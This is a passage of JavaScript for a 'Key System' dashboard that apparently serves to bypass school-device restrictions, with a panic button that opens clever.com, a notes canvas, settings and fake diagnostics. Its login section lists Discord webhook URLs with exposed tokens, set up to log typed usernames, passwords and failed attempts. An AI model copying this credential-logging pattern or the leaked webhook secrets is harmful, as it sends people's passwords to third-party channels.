        const themeBtn = document.getElementById('themeToggle');
        const settingsThemeToggle = document.getElementById('settingsThemeToggle');
        
        const applyTheme = (isLight) => {
          document.body.classList.toggle('light-theme', isLight);
          if (isLight) {
            themeBtn.innerText = '☀️ Light Mode';
            settingsThemeToggle.checked = true;
          } else {
            themeBtn.innerText = '🌙 Dark Mode';
            settingsThemeToggle.checked = false;
          }
        };

        const savedTheme = localStorage.getItem('theme');
        applyTheme(savedTheme === 'light');

        themeBtn.addEventListener('click', () => {
          const isLight = document.body.classList.toggle('light-theme');
          applyTheme(isLight);
          localStorage.setItem('theme', isLight ? 'light' : 'dark');
        });
        settingsThemeToggle.addEventListener('change', () => {
          applyTheme(settingsThemeToggle.checked);
          localStorage.setItem('theme', settingsThemeToggle.checked ? 'light' : 'dark');
        });
      },
      
      initButtons: function() {
        // Panic button
        document.getElementById('panicBtn').addEventListener('click', () => { this.showNotification("Pressed 'Panic' button"); window.open('https://clever.com', '_blank'); });
        // Restart button
        document.getElementById('restartBtn').addEventListener('click', () => { this.showNotification("Pressed 'Restart' button"); if(confirm('Are you sure you want to kill the page (restart)?')) { window.location.reload(); } });
        // Fix Issues button
        document.getElementById('fixIssuesBtn').addEventListener('click', () => { this.showNotification("Pressed 'Fix Issues' button"); alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!'); });
        // Full Screen button
        document.getElementById('fullScreenBtn').addEventListener('click', () => { this.showNotification("Pressed 'Full Screen' button"); if (!document.fullscreenElement) { document.documentElement.requestFullscreen().catch(err => { alert(`Error enabling full-screen: ${err.message}`); }); } else { document.exitFullscreen(); } });
        // Zoom buttons
        let zoomLevel = 1; const zoomStep = 0.1; const minZoom = 0.5; const maxZoom = 2;
        document.getElementById('zoomInBtn').addEventListener('click', () => { this.showNotification("Pressed 'Zoom In' button"); if (zoomLevel < maxZoom) { zoomLevel += zoomStep; document.body.style.zoom = zoomLevel; } });
        document.getElementById('zoomOutBtn').addEventListener('click', () => { this.showNotification("Pressed 'Zoom Out' button"); if (zoomLevel > minZoom) { zoomLevel -= zoomStep; document.body.style.zoom = zoomLevel; } });
        // Logout button
        document.getElementById('logoutBtn').addEventListener('click', () => { this.showNotification("Pressed 'Log Out' button"); if (confirm('Are you sure you want to log out?')) { window.location.reload(); } });
      },
      
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn'); // Button to open canvas from quick bar
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid'); // This element is now largely unused in the new layout, but might still be needed if sections are toggled back manually.
        const notesSectionLink = document.querySelector('.sidebar-item[data-section="notes"]'); // Sidebar link for notes

        // Link quick bar button to open canvas and highlight sidebar item
        notesBtn.addEventListener('click', () => { this.showNotification("Opened Notes Canvas"); this.setActiveSidebarLink('notes'); // Activate sidebar item
          mainGrid.style.display = 'none'; // Hide overview sections
          canvasContainer.style.display = 'block'; // Show canvas
        });
        
        // Handle closing canvas either from within canvas controls or sidebar navigation
        document.getElementById('closeCanvasBtn').addEventListener('click', () => { 
          this.showNotification("Closed Notes Canvas"); 
          canvasContainer.style.display = 'none'; // Hide canvas
          mainGrid.style.display = 'flex'; // Show overview sections (or the default layout)
          this.setActiveSidebarLink('overview'); // Re-activate overview link
        });
        
        // When clicking a sidebar link, if it's 'notes', show the canvas
        if (notesSectionLink) {
            notesSectionLink.addEventListener('click', () => {
              // Check if canvas is already visible. If so, do nothing special.
              // If not, make sure it's displayed and other sections are hidden.
              if (canvasContainer.style.display === 'none') {
                mainGrid.style.display = 'none';
                canvasContainer.style.display = 'block';
                this.showNotification("Opened Notes Canvas via Sidebar.");
              }
            });
        }

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = '#111'; ctx.fillRect(0, 0, canvas.width, canvas.height); // Initial canvas background

        let drawing = false;
        let lastPos = { x: 0, y: 0 };

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          const isTouchEvent = evt.touches && evt.touches.length > 0;
          const clientX = isTouchEvent ? evt.touches[0].clientX : evt.clientX;
          const clientY = isTouchEvent ? evt.touches[0].clientY : evt.clientY;
          return { x: clientX - rect.left, y: clientY - rect.top };
        }

        const startDrawing = (e) => {
          drawing = true;
          lastPos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(lastPos.x, lastPos.y);
          e.preventDefault();
        };

        const draw = (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent-color') || '#ff914d';
          ctx.lineWidth = 2;
          ctx.lineCap = 'round';
          ctx.stroke();
          lastPos = pos;
          e.preventDefault();
        };
        
        const stopDrawing = () => { drawing = false; };

        canvas.addEventListener('mousedown', startDrawing);
        canvas.addEventListener('touchstart', startDrawing);
        canvas.addEventListener('mousemove', draw);
        canvas.addEventListener('touchmove', draw);
        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => canvas.addEventListener(evtName, stopDrawing));

        document.getElementById('clearCanvasBtn').addEventListener('click', () => { this.showNotification("Cleared Notes Canvas"); ctx.fillStyle = '#111'; ctx.fillRect(0, 0, canvas.width, canvas.height); });
        document.getElementById('exportNotesBtn').addEventListener('click', () => { this.showNotification("Exporting notes canvas..."); const link = document.createElement('a'); link.download = 'notes_canvas.png'; link.href = canvas.toDataURL('image/png'); link.click(); this.showNotification("Notes saved as PNG!"); });
      },
      
      initPanels: function() {
        // Initially hide all panels and content sections not targeted by sidebar
        document.querySelectorAll('.info-panel, .ipad-content, .bypass-content, .content-section').forEach(el => {
          // Except for the default 'overview' section which should be visible on load
          if (el.id !== 'overview' && el.id !== 'preloader' && el.id !== 'loginBox') {
             el.style.display = 'none';
          }
        });
      },
      
      initSidebar: function() {
        const sidebar = document.getElementById('sidebar');
        const sidebarToggle = document.getElementById('sidebarToggle');
        const mainContent = document.getElementById('mainContent');

        sidebarToggle.addEventListener('click', () => {
          sidebar.classList.toggle('collapsed');
          mainContent.classList.toggle('collapsed');
          const icon = sidebarToggle.querySelector('i');
          if (sidebar.classList.contains('collapsed')) {
            icon.style.transform = 'rotate(180deg)';
          } else {
            icon.style.transform = 'rotate(0deg)';
          }
          this.showNotification("Sidebar toggled.");
        });

        // Add event listeners for sidebar navigation links
        document.querySelectorAll('.sidebar-item').forEach(item => {
          item.addEventListener('click', (e) => {
            // Prevent default anchor behavior unless it's an external link
            if (item.getAttribute('href').startsWith('#')) {
              e.preventDefault();
              const sectionId = item.getAttribute('data-section');
              this.scrollToSection(sectionId);
              this.setActiveSidebarLink(sectionId); // Set active link immediately
            }
          });
        });
      },
      
      initSystemStatus: function() {
        const updateSystemStatus = () => {
          const cpuUsage = document.getElementById('cpuUsage');
          const ramUsage = document.getElementById('ramUsage');
          const diskSpace = document.getElementById('diskSpace');

          const currentCpu = Math.floor(Math.random() * 70) + 10;
          cpuUsage.textContent = `${currentCpu}%`;
          cpuUsage.classList.toggle('critical', currentCpu > 75);

          const usedRamMB = Math.floor(Math.random() * 12000) + 2000;
          ramUsage.textContent = `${(usedRamMB / 1024).toFixed(1)}GB / 16GB`;
          const ramPercentage = (usedRamMB / (16 * 1024)) * 100;
          ramUsage.classList.toggle('critical', ramPercentage > 85);

          const availableDiskGB = Math.floor(Math.random() * 600) + 100;
          diskSpace.textContent = `${availableDiskGB}GB / 1TB`;
          diskSpace.classList.toggle('critical', availableDiskGB < 200);
        };

        updateSystemStatus(); // Initial call
        setInterval(updateSystemStatus, 5000); // Update every 5 seconds

        setTimeout(() => { // Simulate a security alert
          const securityStatus = document.querySelector('.system-status-widget .status-value.critical');
          if (securityStatus && securityStatus.textContent === 'Threat Detected') {
            this.showNotification("Security alert: Critical threat detected in system status!");
            this.addActivityLog("Critical threat detected in System Status.", '<i class="fas fa-exclamation-triangle"></i>');
          }
        }, 2000);

        this.addActivityLog("System initialized.", '<i class="fas fa-check-circle"></i>');
      },
      
      initSectionNav: function() {
        // Handle clicks on sidebar links that scroll to sections
        document.querySelectorAll('.sidebar-item[href^="#"]').forEach(link => {
          link.addEventListener('click', (e) => {
            e.preventDefault();
            const sectionId = link.getAttribute('href').substring(1);
            this.scrollToSection(sectionId);
            this.setActiveSidebarLink(sectionId);
          });
        });

        // Update active sidebar link on scroll
        window.addEventListener('scroll', () => {
            let currentActiveSection = 'overview'; // Default
            const sections = document.querySelectorAll('.content-section');
            let maxScrollDepth = -100; // Threshold for activating section

            sections.forEach(section => {
                const rect = section.getBoundingClientRect();
                // Check if the section is significantly within the viewport
                if (rect.top >= -50 && rect.bottom <= window.innerHeight + 50) { // Adjusted threshold
                    const sectionTopOffset = rect.top;
                    if (sectionTopOffset > maxScrollDepth) {
                        maxScrollDepth = sectionTopOffset;
                        currentActiveSection = section.id;
                    }
                }
            });
            this.setActiveSidebarLink(currentActiveSection);
        });
      },

      // --- Utility Functions ---
      showNotification: function(message) {
        const notificationArea = document.getElementById('notificationArea');
        const notification = document.createElement('div');
        notification.className = 'notification';
        notification.textContent = message;
        
        // Get duration from settings, default to 5s
        const duration = (parseFloat(localStorage.getItem('dashboardSettings')?.split('"notificationDuration":')[1]?.split(',')[0]) || 5) * 1000;
        notification.style.animation = `slideInFromBottom 0.5s forwards, fadeOut 0.5s forwards ${duration}ms`;
        
        notificationArea.appendChild(notification);
        setTimeout(() => notification.remove(), duration + 500); // Remove after fade out
      },
      
      addActivityLog: function(message, iconHTML = '<i class="fas fa-info-circle"></i>') {
          const logContainer = document.querySelector('.activity-log');
          if (!logContainer) return;
          
          const entry = document.createElement('div');
          entry.classList.add('log-entry');
          entry.innerHTML = `${iconHTML} ${message}`;
          
          logContainer.prepend(entry); // Add to the top
          const maxEntries = 5; // Limit log history
          while (logContainer.children.length > maxEntries) {
              logContainer.removeChild(logContainer.lastChild);
          }
      },

      clearLog: function() {
          document.querySelector('.activity-log').innerHTML = '';
          this.showNotification("Activity log cleared.");
      },

      // Panel toggle functions (for info panels, etc.)
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        const isHidden = panel.style.display === 'none';
        
        // Hide all other info panels and reset active state
        document.querySelectorAll('.info-panel').forEach(p => {
          if (p.id !== panelId) {
            p.style.display = 'none';
            const link = document.querySelector(`.sidebar-item[href="#${p.id}"]`);
            if (link) link.classList.remove('active');
          }
        });
        
        // Hide canvas if switching to a panel
        const canvasContainer = document.getElementById('canvasContainer');
        if (panelId !== 'canvasContainer' && canvasContainer && canvasContainer.style.display === 'block') {
            canvasContainer.style.display = 'none';
            this.setActiveSidebarLink('overview'); // Reset to overview link
        }

        panel.style.display = isHidden ? 'block' : 'none';
        if (isHidden) {
            this.showNotification(`Opened: ${panel.querySelector('h2') ? panel.querySelector('h2').innerText : panelId}`);
            const link = document.querySelector(`.sidebar-item[href="#${panelId}"]`);
            if (link) link.classList.add('active');
        } else {
            this.showNotification(`Closed: ${panel.querySelector('h2') ? panel.querySelector('h2').innerText : panelId}`);
            const link = document.querySelector(`.sidebar-item[href="#${panelId}"]`);
            if (link) link.classList.remove('active');
        }
      },
      
      showIpadContent: function(contentId) { /* ... implementation ... */ },
      showBypassContent: function(contentId) { /* ... implementation ... */ },

      scrollToSection: function(sectionId) {
        const targetElement = document.getElementById(sectionId);
        if (!targetElement) return;

        targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
        this.showNotification(`Navigating to: ${sectionId}`);
      },
      
      setActiveSidebarLink: function(sectionId) {
          document.querySelectorAll('.sidebar-item').forEach(link => {
              link.classList.remove('active');
          });
          const activeLink = document.querySelector(`.sidebar-item[data-section="${sectionId}"]`);
          if (activeLink) {
              activeLink.classList.add('active');
          }
      },


      // --- Settings Panel Functions ---
      initSettingsPanel: function() {
        const settings = JSON.parse(localStorage.getItem('dashboardSettings') || '{}');
        
        // Populate UI elements
        document.getElementById('settingsThemeToggle').checked = settings.theme === 'light';
        this.applySetting('theme');

        if (settings.accentColor) document.getElementById('settingsAccentColor').value = settings.accentColor;
        this.applySetting('accentColor');

        if (settings.fontSize !== undefined) document.getElementById('settingsFontSize').value = settings.fontSize;
        this.applySetting('fontSize');

        if (settings.uiDensity !== undefined) document.getElementById('settingsUIDensity').value = settings.uiDensity;
        this.applySetting('uiDensity');

        if (settings.cpuCores !== undefined) document.getElementById('settingsCPUCores').value = settings.cpuCores;
        if (settings.totalRAM !== undefined) document.getElementById('settingsTotalRAM').value = settings.totalRAM;
        if (settings.osVersion) document.getElementById('settingsOSVersion').value = settings.osVersion;
        if (settings.networkSpeed) document.getElementById('settingsNetworkSpeed').value = settings.networkSpeed;
        if (settings.totalDisk) document.getElementById('settingsTotalDisk').value = settings.totalDisk;
        if (settings.availableDisk !== undefined) document.getElementById('settingsAvailableDisk').value = settings.availableDisk;

        if (settings.passwordPolicy) document.getElementById('settingsPasswordPolicy').value = settings.passwordPolicy;
        if (settings.firewallStatus !== undefined) document.getElementById('settingsFirewallStatus').checked = settings.firewallStatus;
        if (settings.antivirusStatus !== undefined) document.getElementById('settingsAntivirusStatus').checked = settings.antivirusStatus;
        if (settings.sessionTimeout !== undefined) document.getElementById('settingsSessionTimeout').value = settings.sessionTimeout;

        if (settings.enableAnimations !== undefined) document.getElementById('settingsEnableAnimations').checked = settings.enableAnimations;
        this.applySetting('enableAnimations'); 

        if (settings.animationSpeed !== undefined) document.getElementById('settingsAnimationSpeed').value = settings.animationSpeed;
        this.applySetting('animationSpeed');
        if (settings.notificationDuration !== undefined) document.getElementById('settingsNotificationDuration').value = settings.notificationDuration;
        this.applySetting('notificationDuration');
        if (settings.soundAlerts !== undefined) document.getElementById('settingsSoundAlerts').checked = settings.soundAlerts;

        if (settings.customCSS) document.getElementById('settingsCustomCSS').value = settings.customCSS;
        this.applySetting('customCSS');

        // Load reminders
        if (settings.reminders) {
            settings.reminders.forEach(reminder => this.addReminderToList(reminder.text, reminder.datetime, false));
        }

        // Add listeners for live updates
        document.getElementById('settingsThemeToggle').addEventListener('change', () => this.applySetting('theme'));
        document.getElementById('settingsAccentColor').addEventListener('input', () => this.applySetting('accentColor'));
        document.getElementById('settingsFontSize').addEventListener('input', () => this.applySetting('fontSize'));
        document.getElementById('settingsUIDensity').addEventListener('input', () => this.applySetting('uiDensity'));
        document.getElementById('settingsCPUCores').addEventListener('input', () => this.applySetting('cpuCores'));
        document.getElementById('settingsTotalRAM').addEventListener('input', () => this.applySetting('totalRAM'));
        document.getElementById('settingsOSVersion').addEventListener('input', () => this.applySetting('osVersion'));
        document.getElementById('settingsNetworkSpeed').addEventListener('input', () => this.applySetting('networkSpeed'));
        document.getElementById('settingsTotalDisk').addEventListener('input', () => this.applySetting('totalDisk'));
        document.getElementById('settingsAvailableDisk').addEventListener('input', () => this.applySetting('availableDisk'));
        document.getElementById('settingsPasswordPolicy').addEventListener('change', () => this.applySetting('passwordPolicy'));
        document.getElementById('settingsFirewallStatus').addEventListener('change', () => this.applySetting('firewallStatus'));
        document.getElementById('settingsAntivirusStatus').addEventListener('change', () => this.applySetting('antivirusStatus'));
        document.getElementById('settingsSessionTimeout').addEventListener('input', () => this.applySetting('sessionTimeout'));
        document.getElementById('settingsEnableAnimations').addEventListener('change', () => this.applySetting('enableAnimations'));
        document.getElementById('settingsAnimationSpeed').addEventListener('input', () => this.applySetting('animationSpeed'));
        document.getElementById('settingsNotificationDuration').addEventListener('input', () => this.applySetting('notificationDuration'));
        document.getElementById('settingsSoundAlerts').addEventListener('change', () => this.applySetting('soundAlerts'));
        document.getElementById('settingsCustomCSS').addEventListener('input', () => this.applySetting('customCSS'));
      },

      applySetting: function(settingName) {
        const value = this.getSettingValue(settingName);
        
        switch(settingName) {
            case 'theme':
                document.body.classList.toggle('light-theme', value === 'light');
                document.getElementById('themeToggle').innerText = value === 'light' ? '☀️ Light Mode' : '🌙 Dark Mode';
                document.getElementById('settingsThemeToggle').checked = value === 'light';
                // Update accent color dynamically based on theme preference if needed
                const currentAccent = document.getElementById('settingsAccentColor').value;
                document.documentElement.style.setProperty('--accent-color', value === 'light' ? (currentAccent === '#ff914d' ? '#994d00' : currentAccent) : '#ff914d'); 
                break;
            case 'accentColor':
                document.documentElement.style.setProperty('--accent-color', value);
                const accentColorLabel = document.querySelector('.color-picker-wrapper input[type="color"] + label');
                if(accentColorLabel) accentColorLabel.innerText = value;
                // Re-apply styles that depend on accent color
                document.querySelectorAll('h2, .setting-label').forEach(el => el.style.color = value);
                document.querySelectorAll('.box h2, .info-panel h2').forEach(el => el.style.borderBottomColor = value);
                document.querySelectorAll('.quick-bar button, .handbook-buttons button, .links-list a, .exploit-buttons a, .bypass-buttons button, .settings-button').forEach(el => el.style.backgroundColor = value);
                document.querySelectorAll('.calendar .today').forEach(el => el.style.backgroundColor = value + '!important'); 
                // Apply to sidebar items too
                const activeSidebarLink = document.querySelector('.sidebar-item.active');
                if(activeSidebarLink) activeSidebarLink.style.backgroundColor = value;
                break;
            case 'fontSize':
                document.body.style.fontSize = value + 'px'; // Direct font size on body
                document.getElementById('fontSizeValue').innerText = `${value}px`;
                break;
            case 'uiDensity': // Affects spacing, margin, padding
                const density = parseFloat(value);
                document.querySelectorAll('.sidebar-item').forEach(el => el.style.padding = `${12 + (density - 0.5)*10}px 20px`);
                document.getElementById('mainContent').style.padding = `${20 + (density - 0.5)*10}px`;
                document.querySelectorAll('.dashboard-layout .widget').forEach(el => el.style.padding = `${20 + (density - 0.5)*10}px`);
                document.getElementById('uiDensityValue').innerText = density === 0.5 ? "Medium" : density > 0.5 ? "Spacious" : "Compact";
                break;
            // Simulated System Settings
            case 'cpuCores': document.getElementById('settingsCPUCores').value = value; break;
            case 'totalRAM': document.getElementById('settingsTotalRAM').value = value; break;
            case 'osVersion': document.getElementById('settingsOSVersion').value = value; break;
            case 'networkSpeed': document.getElementById('settingsNetworkSpeed').value = value; break;
            case 'totalDisk': document.getElementById('settingsTotalDisk').value = value; break;
            case 'availableDisk': document.getElementById('settingsAvailableDisk').value = value; break;
            case 'passwordPolicy': document.getElementById('settingsPasswordPolicy').value = value; break;
            case 'firewallStatus': document.getElementById('settingsFirewallStatus').checked = value === 'on'; break;
            case 'antivirusStatus': document.getElementById('settingsAntivirusStatus').checked = value === 'on'; break;
            case 'sessionTimeout': document.getElementById('settingsSessionTimeout').value = value; break;
            // Animation Settings
            case 'enableAnimations':
                document.getElementById('settingsEnableAnimations').checked = value === 'on';
                dashboard.toggleAnimations(value === 'on');
                break;
            case 'animationSpeed':
                document.getElementById('settingsAnimationSpeed').value = value;
                document.getElementById('animationSpeedValue').innerText = `${value}x`;
                break;
            case 'notificationDuration':
                document.getElementById('settingsNotificationDuration').value = value;
                document.getElementById('notificationDurationValue').innerText = `${value}s`;
                break;
            case 'soundAlerts':
                document.getElementById('settingsSoundAlerts').checked = value === 'on';
                break;

            case 'customCSS':
                dashboard.applyCustomCSS(value);
                break;
        }
      },

      getSettingValue: function(settingName) {
        const element = document.getElementById(`settings${settingName.charAt(0).toUpperCase() + settingName.slice(1)}`);
        if (!element) return null;
        if (element.type === 'checkbox') return element.checked ? 'on' : 'off';
        if (element.tagName === 'SELECT') return element.value;
        if (element.type === 'color') return element.value;
        if (element.type === 'range') return parseFloat(element.value);
        return element.value;
      },

      loadSettings: function() {
        const settings = JSON.parse(localStorage.getItem('dashboardSettings') || '{}');
        
        // Populate UI elements with defaults if not found in settings
        document.getElementById('settingsThemeToggle').checked = settings.theme === 'light';
        document.getElementById('settingsAccentColor').value = settings.accentColor || '#ff914d';
        document.getElementById('settingsFontSize').value = settings.fontSize || 14;
        document.getElementById('settingsUIDensity').value = settings.uiDensity === undefined ? 0.5 : settings.uiDensity;
        document.getElementById('settingsCPUCores').value = settings.cpuCores !== undefined ? settings.cpuCores : 8;
        document.getElementById('settingsTotalRAM').value = settings.totalRAM !== undefined ? settings.totalRAM : 16;
        document.getElementById('settingsOSVersion').value = settings.osVersion || 'Windows 11 Pro (Simulated)';
        document.getElementById('settingsNetworkSpeed').value = settings.networkSpeed || '1 Gbps (Simulated)';
        document.getElementById('settingsTotalDisk').value = settings.totalDisk || '1 TB SSD (Simulated)';
        document.getElementById('settingsAvailableDisk').value = settings.availableDisk !== undefined ? settings.availableDisk : 500;
        document.getElementById('settingsPasswordPolicy').value = settings.passwordPolicy || 'Standard (8+ Chars, Upper, Lower, Num, Symbol)';
        document.getElementById('settingsFirewallStatus').checked = settings.firewallStatus !== undefined ? settings.firewallStatus : true;
        document.getElementById('settingsAntivirusStatus').checked = settings.antivirusStatus !== undefined ? settings.antivirusStatus : true;
        document.getElementById('settingsSessionTimeout').value = settings.sessionTimeout !== undefined ? settings.sessionTimeout : 15;
        document.getElementById('settingsEnableAnimations').checked = settings.enableAnimations !== undefined ? settings.enableAnimations : true;
        document.getElementById('settingsAnimationSpeed').value = settings.animationSpeed !== undefined ? settings.animationSpeed : 1;
        document.getElementById('settingsNotificationDuration').value = settings.notificationDuration !== undefined ? settings.notificationDuration : 5;
        document.getElementById('settingsSoundAlerts').checked = settings.soundAlerts !== undefined ? settings.soundAlerts : false;
        document.getElementById('settingsCustomCSS').value = settings.customCSS || '';

        // Apply initial settings state to the UI
        this.applySetting('theme');
        this.applySetting('accentColor');
        this.applySetting('fontSize');
        this.applySetting('uiDensity');
        this.applySetting('enableAnimations');
        this.applySetting('animationSpeed');
        this.applySetting('notificationDuration');
        this.applySetting('customCSS');

        // Load reminders
        if (settings.reminders) {
            settings.reminders.forEach(reminder => this.addReminderToList(reminder.text, reminder.datetime, false));
        }
      },

      saveSettings: function() {
        const settings = {
            theme: document.body.classList.contains('light-theme') ? 'light' : 'dark',
            accentColor: document.getElementById('settingsAccentColor').value,
            fontSize: parseInt(document.getElementById('settingsFontSize').value),
            uiDensity: parseFloat(document.getElementById('settingsUIDensity').value),
            cpuCores: parseInt(document.getElementById('settingsCPUCores').value),
            totalRAM: parseInt(document.getElementById('settingsTotalRAM').value),
            osVersion: document.getElementById('settingsOSVersion').value,
            networkSpeed: document.getElementById('settingsNetworkSpeed').value,
            totalDisk: document.getElementById('settingsTotalDisk').value,
            availableDisk: parseInt(document.getElementById('settingsAvailableDisk').value),
            passwordPolicy: document.getElementById('settingsPasswordPolicy').value,
            firewallStatus: document.getElementById('settingsFirewallStatus').checked,
            antivirusStatus: document.getElementById('settingsAntivirusStatus').checked,
            sessionTimeout: parseInt(document.getElementById('settingsSessionTimeout').value),
            enableAnimations: document.getElementById('settingsEnableAnimations').checked,
            animationSpeed: parseFloat(document.getElementById('settingsAnimationSpeed').value),
            notificationDuration: parseInt(document.getElementById('settingsNotificationDuration').value),
            soundAlerts: document.getElementById('settingsSoundAlerts').checked,
            customCSS: document.getElementById('settingsCustomCSS').value,
            reminders: this.getRemindersFromUI()
        };
        localStorage.setItem('dashboardSettings', JSON.stringify(settings));
        this.showNotification("Settings saved successfully!");
      },

      applyCustomCSS: function(css) {
          let styleElement = document.getElementById('customCSSStyles');
          if (!styleElement) {
              styleElement = document.createElement('style');
              styleElement.id = 'customCSSStyles';
              document.head.appendChild(styleElement);
          }
          styleElement.textContent = css;
      },
      
      toggleAnimations: function(enable) {
          if (!enable) {
              document.body.style.transition = 'none'; 
              document.getElementById('mainContent').style.transition = 'none';
              document.getElementById('sidebar').style.transition = 'none';
              console.warn("Animations disabled.");
          } else {
              document.body.style.transition = ''; 
              document.getElementById('mainContent').style.transition = '';
              document.getElementById('sidebar').style.transition = '';
              console.log("Animations enabled.");
          }
      },

      // --- Reminder System ---
      addReminder: function() {
          const textInput = document.getElementById('reminderTextInput');
          const datetimeInput = document.getElementById('reminderDateTimeInput');
          
          const text = textInput.value.trim();
          const datetime = datetimeInput.value; 

          if (!text || !datetime) {
              this.showNotification("Please enter both reminder text and a date/time.");
              return;
          }

          this.addReminderToList(text, datetime, true); 
          textInput.value = '';
          datetimeInput.value = '';
          this.showNotification(`Reminder set for "${text}"`);
      },

      addReminderToList: function(text, datetime, isNew = true) {
          const reminderList = document.getElementById('reminderList');
          const listItem = document.createElement('li');
          
          const dateObj = new Date(datetime);
          const formattedDateTime = dateObj.toLocaleString();

          listItem.innerHTML = `
              <span><strong>${text}</strong><br><small>${formattedDateTime}</small></span>
              <button onclick="dashboard.removeReminder(this)"><i class="fas fa-trash-alt"></i></button>
          `;
          listItem.dataset.text = text;
          listItem.dataset.datetime = datetime; // Store in ISO format for consistency with Date object
          
          reminderList.appendChild(listItem);

          if (isNew) { this.scheduleReminderNotification(text, dateObj); }
      },

      removeReminder: function(button) {
          const listItem = button.closest('li');
          const text = listItem.dataset.text;
          this.showNotification(`Reminder deleted: "${text}"`);
          listItem.remove();
          // Logic to cancel scheduled notification would go here
      },

      scheduleReminderNotification: function(text, dateObj) {
          const now = new Date();
          const timeDiff = dateObj.getTime() - now.getTime();

          if (timeDiff > 0) {
              setTimeout(() => {
                  const reminderExists = Array.from(document.querySelectorAll('#reminderList li')).some(el =>
                      el.dataset.text === text && el.dataset.datetime === dateObj.toISOString()
                  );

                  if (reminderExists) {
                      const soundAlertsEnabled = document.getElementById('settingsSoundAlerts').checked;
                      if (soundAlertsEnabled) { /* Play sound here */ }
                      this.showNotification(`⏰ Reminder: ${text}`);
                  }
              }, timeDiff);
          }
      },

      getRemindersFromUI: function() {
          const reminders = [];
          document.querySelectorAll('#reminderList li').forEach(item => {
              reminders.push({ text: item.dataset.text, datetime: item.dataset.datetime });
          });
          return reminders;
      },

      // --- Dummy Tool Functions ---
      runSystemDiagnostics: function() { alert("Simulating system diagnostics...\nDiagnostics complete. All systems nominal."); },
      openCalculator: function() { alert("Opening simulated calculator..."); },
      openSystemMonitor: function() { alert("Displaying simulated system processes and resource usage."); },
      openFileManager: function() { alert("Accessing simulated file system."); },
      openProcessViewer: function() { alert("Listing simulated active processes."); },
      openNetworkScanner: function() { alert("Scanning simulated network devices."); },
      openSecurityAdvisor: function() { alert("Providing security recommendations based on simulated analysis."); },
      openPasswordGenerator: function() { alert("Generating a strong, secure password for you."); },
      openDataEncryptor: function() { alert("Preparing data encryption tools."); },
      openSystemCleaner: function() { alert("Simulating system cache and temporary file cleanup."); },
      openBackupUtility: function() { alert("Initiating simulated backup process."); },
      openRemoteAccess: function() { alert("Establishing simulated secure remote connection."); },
      openDataRecovery: function() { alert("Preparing simulated data recovery tools."); },
    };

    // Handle tool clicks to integrate with notification system and execute functions
    function handleToolClick(toolName, action) {
      dashboard.showNotification(`Opening tool: ${toolName}`);
      if (action) { action(); }
    }

    // --- Preloader Logic ---
    function animatePreloader() {
        const preloader = document.getElementById('preloader');
        const preloaderText = document.getElementById('preloaderText');
        const loginBox = document.getElementById('loginBox');

        // Stage 1: Initializing System..
        preloaderText.textContent = 'Initializing System..';
        preloaderText.style.animation = 'flashPreloaderText 2s infinite alternate';
        document.querySelector('.preloader-box').style.animation = 'pulseBorder 2s infinite ease-in-out';

        // Stage 2: Key System
        setTimeout(() => {
            preloaderText.textContent = 'Key System';
            preloaderText.style.animation = 'flashPreloaderText 1s infinite alternate';
            document.querySelector('.preloader-box').style.animation = 'none';
            document.querySelector('.preloader-box').style.borderColor = '#ff914d';
            document.querySelector('.preloader-box').style.boxShadow = '0 0 40px #ff914d';

            // Stage 3: Dashboard
            setTimeout(() => {
                preloaderText.textContent = 'Dashboard';
                preloaderText.style.animation = 'flashPreloaderText 0.5s infinite alternate';
                document.querySelector('.preloader-box').style.borderColor = '#ffd966';
                document.querySelector('.preloader-box').style.boxShadow = '0 0 40px #ffd966';

                // Final transition: hide preloader, show login & dashboard
                setTimeout(() => {
                    preloader.style.opacity = '0';
                    setTimeout(() => {
                        preloader.style.display = 'none';
                        loginBox.style.display = 'none'; // Hide login after preloader
                        document.body.classList.add('dashboard-body'); // Apply dashboard class to body
                        document.getElementById('dashboard').style.display = 'block'; // Show dashboard content
                        dashboard.init(); // Initialize all dashboard features
                    }, 500); 
                }, 1500);
            }, 1500);
        }, 1500);
    }

    // --- Login System JavaScript ---
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      const loggingWebhooks = { /* ... webhook URLs ... */
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
